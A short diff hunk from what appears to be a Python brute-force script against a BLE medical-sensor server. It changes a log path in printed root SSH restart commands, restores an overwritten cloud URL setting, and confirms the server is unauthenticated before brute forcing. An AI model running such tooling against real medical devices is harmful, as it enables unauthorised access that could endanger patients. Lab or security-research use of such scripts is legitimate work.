@@ -128,7 +128,7 @@ async def brute():
             print("[!]   ssh root@192.168.2.1 'kill -9 $(pgrep -f ble_server.py)'")
             print("[!]   ssh root@192.168.2.1 '( setsid /usr/bin/python3 -u "
                   "/opt/medical-sensor/ble_server.py "
-                  ">>/tmp/ble_server.log 2>&1 </dev/null & )'")
+                  ">>/var/log/ble_server.log 2>&1 </dev/null & )'")
             await _restore_cloud_url(c, cfg_chr, original_url)
             return None
         print("[+] Pre-flight OK: server is unauthenticated, brute force will run.")
